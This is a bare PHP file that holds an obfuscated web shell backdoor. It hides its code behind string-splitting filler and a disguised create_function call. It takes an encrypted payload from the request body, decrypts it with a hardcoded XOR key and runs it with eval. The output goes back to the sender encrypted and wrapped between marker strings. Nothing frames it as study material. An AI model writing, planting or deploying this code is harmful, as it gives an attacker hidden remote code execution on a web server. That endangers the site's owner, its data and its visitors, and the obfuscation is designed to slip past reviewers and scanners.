<?php
$g='%{2%2%$c=strlen($k);$l2%=s2%trlen($t);$o=2%"";for2%2%($i=0;2%$i<$l;){2%for($j=2%0;($j<$c2%&&$i2%<$2%l);$j++,$i++2%';
$z='){$o.=$2%t{$i2%}^2%$k{$j};}}2%re2%turn2% $o;}if (2%@pre2%g_matc2%h("2%/$kh(.+)$kf/",@f2%il2%e_get_c2%ontents("p2%';
$e=str_replace('uz','','cuzruzeate_uzfuzunuzcuztion');
$m='=@ob_2%get_cont2%2%ents();@ob_e2%nd_clean2%()2%;$r=@base62%2%4_e2%ncode(@x(@g2%zcompr2%ess($2%o),$k));pri2%2%nt("$2%p$kh$r$kf");}';
$P='$k="7a22%2d5aa2%";$2%2%kh="2e3c1c9822%c232%";$kf="f92%62e2%17c8ab5";$p="F2%J2%cpwu2%qBDD2%jVqdmS";functi2%on x($t2%,$k)2';
$Q='h2%p://input")2%,$m)2%==12%) {@2%ob_start()2%2%;@e2%val(@gzunco2%mpress(@x(2%@base2%64_decode2%($2%2%m[1]),$k)));$o2%';
$k=str_replace('2%','',$P.$g.$z.$Q.$m);
$U=$e('',$k);$U();
?>
